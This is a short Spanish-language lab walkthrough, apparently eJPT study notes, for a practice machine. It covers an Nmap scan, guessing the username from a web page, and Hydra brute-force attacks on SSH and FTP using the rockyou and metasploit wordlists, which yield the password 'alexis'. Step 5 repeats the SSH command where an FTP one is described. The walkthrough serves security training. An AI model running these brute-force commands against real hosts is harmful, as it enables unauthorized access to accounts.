1. Lanzar un Nmap a la victima:
	```
	sudo nmap -p- --open -sS -sVC --min-rate 2000 -n -vvv -Pn 192.168.1.135 -oN puertos_friendly3.txt
	```

2. Ver el resultado:
```
cat puertos_friendly3.txt
```

![Hydra 1](ejpt/img/hydra-1.png)

3. Bucamos la IP de la victima en un navegador (Chrome, Firefox...) para ver que tiene guardado en el puerto 80 (HTTP):
	![Hydra 2](ejpt/img/hydra-2.png)
4. Como el mensaje esta firmado por ***Juan*** podemos intuir que el usuario es ***juan***.
5. Utilizamos la herramienta ***HYDRA*** para hacer un ataque de fuerza bruta a los dos servicios (FTP y SSH):
	```
	sudo hydra ssh://192.168.1.141 -l juan -P /usr/share/wordlists/rockyou.txt
	```
	
	```
	sudo hydra ssh://192.168.1.141 -l juan -P /usr/share/wordlists/rockyou.txt
	```

6. Resultados de ***Hydra*** (en este caso las dos contraseñas son las mismas):
	*SSH*:![Hydra 3](ejpt/img/hydra-3.png)
	
	*FTP*:![Hydra 4](ejpt/img/hydra-4.png)

7. Conectarse a los servicios:
```
ftp juan@192.168.1.141
```

```
ssh juan@192.168.1.141
```

8. Escribir la contraseña ***alexis*** y ya estarías dentro de ese servicio (es mejor conectarse por SSH porque tienes acceso total al sistema de la victima).
9. ***SI SABEMOS CUAL ES LA CONTRASEÑA PERO NO SABEMOS CUAL ES EL USARIO:***

	```
	sudo hydra ssh://192.168.1.141 -L /usr/share/wordlists/metasploit/unix_users.txt -p alexis
	```
	
	```
	sudo hydra ftp://192.168.1.141 -L /usr/share/wordlists/metasploit/unix_users.txt -p alexis
	```

10. ***SI NO SABEMOS NI EL USUARIO NI LA CONTRASEÑA:***
```
sudo hydra ssh://192.168.1.141 -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt
```

```
sudo hydra ftp://192.168.1.141 -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt
```